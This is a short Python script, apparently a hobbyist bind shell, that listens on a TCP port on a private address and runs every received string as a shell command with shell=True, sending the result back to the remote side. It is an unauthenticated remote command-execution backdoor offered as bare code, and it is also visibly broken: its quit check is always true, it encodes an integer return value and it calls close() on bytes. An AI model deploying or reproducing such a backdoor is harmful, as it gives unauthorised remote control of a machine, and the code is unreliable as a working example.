#!/bin/python3

import socket
import subprocess


sockboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

with sockboi as s:
    s.bind(("192.168.8.2", 1500))
    s.listen(2)
    me, addr = s.accept()
    com = me.recv(2048)
    while com != 'quit' or 'exit':
        com = str(com)
        out = subprocess.check_call(com, shell=True)
        me.send(out.encode())
        com = me.recv(2048)
    com.close()
s.close()

